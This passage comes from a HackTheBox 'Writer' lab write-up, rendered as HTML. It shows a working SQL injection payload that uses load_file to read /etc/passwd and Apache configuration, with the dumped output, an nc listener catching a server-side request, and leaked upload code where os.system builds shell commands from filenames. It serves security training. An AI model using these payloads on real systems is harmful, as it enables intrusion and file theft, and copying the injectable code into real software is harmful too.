class="c2"><br><br>Writeup<br>-----------------------------12417370376638841362770592069<br>Content-Disposition: form-</span><span class="c11">data</span><span class="c2">; </span><span class="c11">name</span><span class="c2">=</span><span class="c2 c12">&quot;tagline&quot;</span><span class="c2"><br><br>Writeup<br>-----------------------------12417370376638841362770592069<br>Content-Disposition: form-</span><span class="c11">data</span><span class="c2">; </span><span class="c11">name</span><span class="c2">=</span><span class="c2 c12">&quot;image&quot;</span><span class="c2">; filename=</span><span class="c2 c12">&quot;&quot;</span><span class="c2"><br>Content-Type: application/octet-stream<br><br><br>-----------------------------12417370376638841362770592069<br></span><span class="c2 c40">Content-Disposition: form-</span><span class="c18 c40">data</span><span class="c2 c40">; </span><span class="c18 c40">name</span><span class="c2 c40">=&quot;image_url&quot;<br><br>http://10.10.15.80/image.jpg</span><span class="c2"><br>-----------------------------12417370376638841362770592069<br>Content-Disposition: form-</span><span class="c11">data</span><span class="c2">; </span><span class="c11">name</span><span class="c2">=</span><span class="c2 c12">&quot;content&quot;</span><span class="c2"><br><br>Thanks </span><span class="c11">for</span><span class="c2">&nbsp;reading!<br>-----------------------------12417370376638841362770592069--</span></p></td></tr></table><p class="c10"><span class="c35 c45">Note the &ldquo;image_url&rdquo; parameter highlighted in red</span><span class="c9"><br></span></p><p class="c8 c26"><span class="c36">Response</span></p><a id="t.b1a0f2c40331580d628ca2fc236fd6f670e7587b"></a><a id="t.3"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">&#9484;&#9472;[&#10007;]&#9472;[0xd4y@Writeup]&#9472;[~/business/hackthebox/medium/linux/writer]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c2 c46">$sudo</span><span class="c2">&nbsp;nc -lvnp 80<br>listening on [any] 80 </span><span class="c11">..</span><span class="c2">.<br>connect </span><span class="c11">to</span><span class="c2">&nbsp;[10.10.15.80] </span><span class="c11">from</span><span class="c2">&nbsp;(UNKNOWN) [10.10.11.101] 38018<br></span><span class="c11">GET</span><span class="c2">&nbsp;/image.jpg HTTP/1.1<br>Accept-Encoding:</span><span class="c11">&nbsp;identity<br></span><span class="c2">Host: 10.10.15.80<br>User-Agent: Python-urllib/3.8<br>Connection: close</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">Judging from the user-agent, it was found that the server is running python. After failing to obtain code executions despite trying many different upload attacks, it follows that the source code of the upload feature must be leaked to determine how it works. </span></p><h3 class="c15" id="h.g4h70w2pg84e"><span>Leveraging</span><span class="c32">&nbsp;SQLi to Read Local Files</span></h3><p class="c10"><span>This is possible via the </span><span class="c16">load_file</span><span class="c7">&nbsp;SQL function. Going back to the login page, this function can be used in conjunction with a union select statement to leak files:</span></p><p class="c10"><span class="c7">&nbsp;</span></p><p class="c8 c26"><span class="c36">Payload</span></p><a id="t.1024ecfaa765e83bdddbd3434c8091320cc2deb2"></a><a id="t.4"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">uname=&#39;union select 1,load_file(&#39;/etc/passwd&#39;),3,4,5,6-- -&amp;password=a</span></p></td></tr></table><p class="c8 c26 c51"><span class="c9"></span></p><p class="c8 c26"><span class="c36">Response</span></p><a id="t.1b4adaccc79af479c5ff4f7301baee40d836c344"></a><a id="t.5"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">Welcome </span><span class="c2 c6">root:x:</span><span class="c2">0</span><span class="c2 c6">:</span><span class="c2">0</span><span class="c2 c6">:root:/root:/bin/bash</span><span class="c2"><br></span><span class="c2 c6">daemon:x:</span><span class="c2">1</span><span class="c2 c6">:</span><span class="c2">1</span><span class="c2 c6">:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">bin:x:</span><span class="c2">2</span><span class="c2 c6">:</span><span class="c2">2</span><span class="c2 c6">:bin:/bin:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">sys:x:</span><span class="c2">3</span><span class="c2 c6">:</span><span class="c2">3</span><span class="c2 c6">:sys:/dev:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">sync:x:</span><span class="c2">4</span><span class="c2 c6">:</span><span class="c2">65534</span><span class="c2 c6">:sync:/bin:/bin/sync</span><span class="c2"><br></span><span class="c2 c6">games:x:</span><span class="c2">5</span><span class="c2 c6">:</span><span class="c2">60</span><span class="c2 c6">:games:/usr/games:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">man:x:</span><span class="c2">6</span><span class="c2 c6">:</span><span class="c2">12</span><span class="c2 c6">:man:/var/cache/man:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">lp:x:</span><span class="c2">7</span><span class="c2 c6">:</span><span class="c2">7</span><span class="c2 c6">:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">mail:x:</span><span class="c2">8</span><span class="c2 c6">:</span><span class="c2">8</span><span class="c2 c6">:mail:/var/mail:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">news:x:</span><span class="c2">9</span><span class="c2 c6">:</span><span class="c2">9</span><span class="c2 c6">:news:/var/spool/news:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">uucp:x:</span><span class="c2">10</span><span class="c2 c6">:</span><span class="c2">10</span><span class="c2 c6">:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">proxy:x:</span><span class="c2">13</span><span class="c2 c6">:</span><span class="c2">13</span><span class="c2 c6">:proxy:/bin:/usr/sbin/nologin</span><span class="c2"><br>www-</span><span class="c2 c6">data:x:</span><span class="c2">33</span><span class="c2 c6">:</span><span class="c2">33</span><span class="c2 c6">:www-data:/var/www:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">backup:x:</span><span class="c2">34</span><span class="c2 c6">:</span><span class="c2">34</span><span class="c2 c6">:backup:/var/backups:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">list:x:</span><span class="c2">38</span><span class="c2 c6">:</span><span class="c2">38</span><span class="c2 c6">:Mailing</span><span class="c2">&nbsp;List </span><span class="c2 c6">Manager:</span><span class="c2">/var/</span><span class="c2 c6">list:</span><span class="c2">/usr/sbin/nologin<br></span><span class="c2 c6">irc:x:</span><span class="c2">39</span><span class="c2 c6">:</span><span class="c2">39</span><span class="c2 c6">:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">gnats:x:</span><span class="c2">41</span><span class="c2 c6">:</span><span class="c2">41</span><span class="c2 c6">:Gnats</span><span class="c2">&nbsp;Bug-Reporting System (admin)</span><span class="c2 c6">:/var/lib/gnats:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">nobody:x:</span><span class="c2">65534</span><span class="c2 c6">:</span><span class="c2">65534</span><span class="c2 c6">:nobody:/nonexistent:/usr/sbin/nologin</span><span class="c2"><br>systemd-</span><span class="c2 c6">network:x:</span><span class="c2">100</span><span class="c2 c6">:</span><span class="c2">102</span><span class="c2 c6">:systemd</span><span class="c2">&nbsp;Network Management,,,</span><span class="c2 c6">:/run/systemd:/usr/sbin/nologin</span><span class="c2"><br>systemd-</span><span class="c2 c6">resolve:x:</span><span class="c2">101</span><span class="c2 c6">:</span><span class="c2">103</span><span class="c2 c6">:systemd</span><span class="c2">&nbsp;Resolver,,,</span><span class="c2 c6">:/run/systemd:/usr/sbin/nologin</span><span class="c2"><br>systemd-</span><span class="c2 c6">timesync:x:</span><span class="c2">102</span><span class="c2 c6">:</span><span class="c2">104</span><span class="c2 c6">:systemd</span><span class="c2">&nbsp;Time Synchronization,,,</span><span class="c2 c6">:/run/systemd:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">messagebus:x:</span><span class="c2">103</span><span class="c2 c6">:</span><span class="c2">106</span><span class="c2 c6">::/nonexistent:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">syslog:x:</span><span class="c2">104</span><span class="c2 c6">:</span><span class="c2">110</span><span class="c2 c6">::/home/syslog:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">_apt:x:</span><span class="c2">105</span><span class="c2 c6">:</span><span class="c2">65534</span><span class="c2 c6">::/nonexistent:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">tss:x:</span><span class="c2">106</span><span class="c2 c6">:</span><span class="c2">111</span><span class="c2 c6">:TPM</span><span class="c2">&nbsp;software stack,,,</span><span class="c2 c6">:/var/lib/tpm:/bin/false</span><span class="c2"><br></span><span class="c2 c6">uuidd:x:</span><span class="c2">107</span><span class="c2 c6">:</span><span class="c2">112</span><span class="c2 c6">::/run/uuidd:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">tcpdump:x:</span><span class="c2">108</span><span class="c2 c6">:</span><span class="c2">113</span><span class="c2 c6">::/nonexistent:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">landscape:x:</span><span class="c2">109</span><span class="c2 c6">:</span><span class="c2">115</span><span class="c2 c6">::/var/lib/landscape:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">pollinate:x:</span><span class="c2">110</span><span class="c2 c6">:</span><span class="c2">1</span><span class="c2 c6">::/var/cache/pollinate:/bin/false</span><span class="c2"><br></span><span class="c2 c6">usbmux:x:</span><span class="c2">111</span><span class="c2 c6">:</span><span class="c2">46</span><span class="c2 c6">:usbmux</span><span class="c2">&nbsp;daemon,,,</span><span class="c2 c6">:/var/lib/usbmux:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">sshd:x:</span><span class="c2">112</span><span class="c2 c6">:</span><span class="c2">65534</span><span class="c2 c6">::/run/sshd:/usr/sbin/nologin</span><span class="c2"><br>systemd-</span><span class="c2 c6">coredump:x:</span><span class="c2">999</span><span class="c2 c6">:</span><span class="c2">999</span><span class="c2 c6">:systemd</span><span class="c2">&nbsp;Core </span><span class="c2 c6">Dumper:</span><span class="c2">/</span><span class="c2 c6">:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">kyle:x:</span><span class="c2">1000</span><span class="c2 c6">:</span><span class="c2">1000</span><span class="c2 c6">:Kyle</span><span class="c2">&nbsp;</span><span class="c2 c6">Travis:</span><span class="c2">/home/</span><span class="c2 c6">kyle:</span><span class="c2">/bin/bash<br></span><span class="c2 c6">lxd:x:</span><span class="c2">998</span><span class="c2 c6">:</span><span class="c2">100</span><span class="c2 c6">::/var/snap/lxd/common/lxd:/bin/false</span><span class="c2"><br></span><span class="c2 c6">postfix:x:</span><span class="c2">113</span><span class="c2 c6">:</span><span class="c2">118</span><span class="c2 c6">::/var/spool/postfix:/usr/sbin/nologin</span><span class="c2"><br></span><span class="c2 c6">filter:x:</span><span class="c2">997</span><span class="c2 c6">:</span><span class="c2">997</span><span class="c2 c6">:Postfix</span><span class="c2">&nbsp;</span><span class="c2 c6">Filters:</span><span class="c2">/var/spool/</span><span class="c2 c6">filter:</span><span class="c2">/bin/sh<br></span><span class="c2 c6">john:x:</span><span class="c2">1001</span><span class="c2 c6">:</span><span class="c2">1001</span><span class="c2 c6">:</span><span class="c2">,,,</span><span class="c2 c6">:/home/john:/bin/bash</span><span class="c2"><br></span><span class="c2 c6">mysql:x:</span><span class="c2">114</span><span class="c2 c6">:</span><span class="c2">120</span><span class="c2 c6">:MySQL</span><span class="c2">&nbsp;Server,,,</span><span class="c2 c6">:/nonexistent:/bin/false</span></p></td></tr></table><h2 class="c15" id="h.ipxz7iecqxp"><span class="c4">Getting RCE</span></h2><h3 class="c15" id="h.qinf94u9q24o"><span class="c32">Source Code Analysis</span></h3><p class="c10"><span>Before being able to read the source code of the website, the full path of the file containing the source code must first be discovered. Seeing as the server is running apache2, the </span><span class="c16">000-default.conf</span><span>&nbsp;file in the </span><span class="c16">/etc/apache2/sites-available</span><span class="c7">&nbsp;directory, a directory which holds configuration files for Apache virtual hosts, can be leaked to determine this information. &nbsp;</span></p><p class="c8 c26 c51"><span class="c9"></span></p><p class="c8 c26"><span class="c9">Payload</span></p><a id="t.3c6c6a286229dc0e28db09e9ee9ffc3b16a95284"></a><a id="t.6"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">uname=&#39;union select 1,load_file(&#39;/etc/apache2/sites-available/000-default.conf&#39;),3,4,5,6-- -&amp;password=a</span></p></td></tr></table><p class="c8 c26"><span class="c9"><br>Response</span></p><a id="t.7a46cfd2c965984ece994a9a036e8c707a8d7294"></a><a id="t.7"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">Welcome # Virtual host configuration </span><span class="c11">for</span><span class="c2">&nbsp;writer.htb domain<br>&amp;lt;VirtualHost *:80&amp;gt;<br> &nbsp; &nbsp; &nbsp; &nbsp;ServerName writer.htb<br> &nbsp; &nbsp; &nbsp; &nbsp;ServerAdmin admin@writer.htb<br> &nbsp; &nbsp; &nbsp; &nbsp;WSGIScriptAlias / </span><span class="c2 c34">/</span><span class="c18 c34">var</span><span class="c2 c34">/www/writer.htb/writer.wsgi</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp;&amp;lt;Directory /</span><span class="c11">var</span><span class="c2">/www/writer.htb&amp;gt;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Order allow,deny<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Allow from all<br> &nbsp; &nbsp; &nbsp; &nbsp;&amp;lt;/Directory&amp;gt;<br> &nbsp; &nbsp; &nbsp; &nbsp;Alias /</span><span class="c11">static</span><span class="c2">&nbsp;/</span><span class="c11">var</span><span class="c2">/www/writer.htb/writer/</span><span class="c11">static</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp;&amp;lt;Directory /</span><span class="c11">var</span><span class="c2">/www/writer.htb/writer/</span><span class="c11">static</span><span class="c2">/&amp;gt;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Order allow,deny<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Allow from all<br> &nbsp; &nbsp; &nbsp; &nbsp;&amp;lt;/Directory&amp;gt;<br> &nbsp; &nbsp; &nbsp; &nbsp;ErrorLog ${APACHE_LOG_DIR}/error.log<br> &nbsp; &nbsp; &nbsp; &nbsp;LogLevel warn<br> &nbsp; &nbsp; &nbsp; &nbsp;CustomLog ${APACHE_LOG_DIR}/access.log combined<br>&amp;lt;/VirtualHost&amp;gt;<br><br></span><span class="c18 c6"># Virtual host configuration for dev.writer.htb subdomain</span><span class="c2"><br></span><span class="c18 c6"># Will enable configuration after completing backend development</span><span class="c2"><br></span><span class="c18 c6"># Listen 8080</span><span class="c2"><br></span><span class="c18 c6">#&amp;lt;VirtualHost 127.0.0.1:8080&amp;gt;</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServerName dev.writer.htb</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServerAdmin admin@writer.htb</span><span class="c2"><br></span><span class="c18 c6">#</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp;# Collect </span><span class="c11">static</span><span class="c2">&nbsp;</span><span class="c11">for</span><span class="c2">&nbsp;the writer2_project/writer_web/templates<br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alias /static /var/www/writer2_project/static</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lt;Directory /var/www/writer2_project/static&amp;gt;</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Require all granted</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lt;/Directory&amp;gt;</span><span class="c2"><br></span><span class="c18 c6">#</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lt;Directory /var/www/writer2_project/writerv2&amp;gt;</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lt;Files wsgi.py&amp;gt;</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Require all granted</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lt;/Files&amp;gt;</span><span class="c2"><br></span><span class="c6 c18">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lt;/Directory&amp;gt;</span><span class="c2"><br></span><span class="c18 c6">#</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WSGIProcessGroup writer2_project</span><span class="c2"><br></span><span class="c18 c6">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py</span><span class="c2"><br></span><span class="c18 c6"># &nbsp; &nbsp; &nbsp; &nbsp;ErrorLog ${APACHE_LOG_DIR}/error.log</span><span class="c2"><br></span><span class="c18 c6"># &nbsp; &nbsp; &nbsp; &nbsp;LogLevel warn</span><span class="c2"><br></span><span class="c18 c6"># &nbsp; &nbsp; &nbsp; &nbsp;CustomLog ${APACHE_LOG_DIR}/access.log combined</span><span class="c2"><br></span><span class="c18 c6">#</span><span class="c2"><br></span><span class="c18 c6">#&amp;lt;/VirtualHost&amp;gt;</span><span class="c2"><br></span><span class="c18 c6"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></p></td></tr></table><p class="c1 c51"><span class="c7"></span></p><p class="c10"><span>In particular, note the directory in which the </span><span class="c16">writer.wsgi</span><span>&nbsp;file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an </span><span class="c16">__init__.py</span><span>&nbsp;file within </span><span class="c16">/var/www/writer.htb/writer/</span><span class="c7">. Leaking this file reveals the following contents:</span></p><a id="t.810b78aedc1c5d23ec7e6da85383ab7a5a640c9c"></a><a id="t.8"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c11">if</span><span class="c2">&nbsp;request.</span><span class="c11">method</span><span class="c2">&nbsp;== </span><span class="c2 c12">&quot;POST&quot;</span><span class="c2">:<br> &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c11">if</span><span class="c2">&nbsp;request.files[&#39;</span><span class="c11">image</span><span class="c2">&#39;]:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">image</span><span class="c2">&nbsp;= request.files[&#39;</span><span class="c11">image</span><span class="c2">&#39;]<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c11">if</span><span class="c2">&nbsp;</span><span class="c2 c12">&quot;.jpg&quot;</span><span class="c2">&nbsp;</span><span class="c11">in</span><span class="c2">&nbsp;</span><span class="c11">image</span><span class="c2">.filename:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; path = </span><span class="c2 c50">os.path.</span><span class="c18 c50">join</span><span class="c2 c50">(&#39;/</span><span class="c18 c50">var</span><span class="c2 c50">/www/writer.htb/writer/static/img/&#39;, </span><span class="c18 c50">image</span><span class="c2 c50">.filename)</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">image</span><span class="c2">.</span><span class="c11">save</span><span class="c2">(path)$<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">image</span><span class="c2">&nbsp;= </span><span class="c2 c12">&quot;/img/{}&quot;</span><span class="c2">.format(</span><span class="c11">image</span><span class="c2">.filename)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">else</span><span class="c2">:$<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">error</span><span class="c2">&nbsp;= </span><span class="c2 c12">&quot;File extensions must be in .jpg!&quot;</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">return</span><span class="c2">&nbsp;render_template(&#39;add.html&#39;, </span><span class="c11">error</span><span class="c2">=</span><span class="c11">error</span><span class="c2">) &nbsp; &nbsp; &nbsp;<br> &nbsp;</span><span class="c11">if</span><span class="c2">&nbsp;request.form.</span><span class="c11">get</span><span class="c2">(</span><span class="c2 c12">&#39;image_url&#39;</span><span class="c2">):<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image_url = request.form.</span><span class="c11">get</span><span class="c2">(</span><span class="c2 c12">&#39;image_url&#39;</span><span class="c2">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">if</span><span class="c2">&nbsp;</span><span class="c2 c12">&quot;.jpg&quot;</span><span class="c2">&nbsp;in image_ur</span><span class="c2 c46">l:</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">try</span><span class="c2">:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c2 c63">local_filename, headers = urllib.request.urlretrieve(image_url)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.</span><span class="c18 c63">system</span><span class="c2 c63">(&quot;mv {} {}.jpg&quot;.format(local_filename, local_filename))</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image = </span><span class="c2 c12">&quot;{}.jpg&quot;</span><span class="c2">.format(local_filename)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">try</span><span class="c2">:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">im</span><span class="c2">&nbsp;= Image.</span><span class="c11">open</span><span class="c2">(image) <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">im</span><span class="c2">.verify()<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">im</span><span class="c2">.</span><span class="c11">close</span><span class="c2">()<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image = image.replace(</span><span class="c2 c12">&#39;/tmp/&#39;</span><span class="c2">,</span><span class="c2 c12">&#39;&#39;</span><span class="c2">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c2 c40">os.</span><span class="c18 c40">system</span><span class="c2 c40">(&quot;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}&quot;.format(image, image))</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image = </span><span class="c2 c12">&quot;/img/{}&quot;</span><span class="c2">.format(image)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;except PIL.UnidentifiedImageError:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c2 c40">os.</span><span class="c18 c40">system</span><span class="c2 c40">(&quot;rm {}&quot;.format(image))</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;error = </span><span class="c2 c12">&quot;Not a valid image file!&quot;</span><span class="c25 c2 c54"><br>... &nbsp;</span></p><p class="c1"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c11">if</span><span class="c2">&nbsp;request.form.</span><span class="c11">get</span><span class="c2">(</span><span class="c2 c12">&#39;image_url&#39;</span><span class="c2">):<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image_url = request.form.</span><span class="c11">get</span><span class="c2">(</span><span class="c2 c12">&#39;image_url&#39;</span><span class="c2">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">if</span><span class="c2">&nbsp;</span><span class="c2 c12">&quot;.jpg&quot;</span><span class="c2">&nbsp;in image_ur</span><span class="c2 c46">l:</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">try</span><span class="c2">:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;local_filename, headers = urllib.request.urlretrieve(image_url)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c2 c43">os.</span><span class="c18 c43">system</span><span class="c2 c43">(&quot;mv {} {}.jpg&quot;.format(local_filename, local_filename))</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image = </span><span class="c2 c12">&quot;{}.jpg&quot;</span><span class="c2">.format(local_filename)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">try</span><span class="c2">:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">im</span><span class="c2">&nbsp;= Image.</span><span class="c11">open</span><span class="c2">(image) <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">im</span><span class="c2">.verify()<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">im</span><span class="c2">.</span><span class="c11">close</span><span class="c2">()<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image = image.replace(</span><span class="c2 c12">&#39;/tmp/&#39;</span><span class="c2">,</span><span class="c2 c12">&#39;&#39;</span><span class="c2">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c2 c40">os.</span><span class="c18 c40">system</span><span class="c2 c40">(&quot;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}&quot;.format(image, image))</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;image = </span><span class="c2 c12">&quot;/img/{}&quot;</span><span class="c2">.format(image)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">cursor</span><span class="c2">&nbsp;= connector.</span><span class="c11">cursor</span><span class="c2">()<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">cursor</span><span class="c2">.</span><span class="c11">execute</span><span class="c2">(</span><span class="c2 c12">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span><span class="c2">, {</span><span class="c2 c12">&#39;image&#39;</span><span class="c2">:image, </span><span class="c2 c12">&#39;id&#39;</span><span class="c2">:id})<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 